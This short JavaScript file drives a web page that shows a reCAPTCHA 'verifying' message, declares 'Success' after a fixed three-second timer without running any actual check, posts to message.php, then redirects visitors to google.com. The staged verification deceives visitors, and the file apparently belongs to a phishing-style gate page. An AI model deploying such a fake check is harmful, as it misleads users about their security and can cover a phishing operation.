document.addEventListener('DOMContentLoaded', () => {
    const statusText = document.getElementById('status');
    const recaptchaStatusText = document.getElementById('recaptcha-status');
    const spinner = document.getElementById('spinner');

    statusText.textContent = 'Please wait, verifying...';
    recaptchaStatusText.textContent = 'This will only take a moment';

    setTimeout(() => {
        recaptchaStatusText.textContent = 'Success';
        spinner.style.display = 'none';

        fetch('message.php', {
            method: 'POST'
        })
        .then(response => response.text())
        .then(data => {
            console.log("Response from server:", data);
            statusText.textContent = 'Redirecting...';

            setTimeout(() => {
                // REDIRECT URL
                window.location.href = "https://www.google.com";
            }, 1000);
        })
        .catch(error => {
            console.error("An error occurred:", error);
            statusText.textContent = 'An error occurred. Please try again later.';
        });
    }, 3000);
});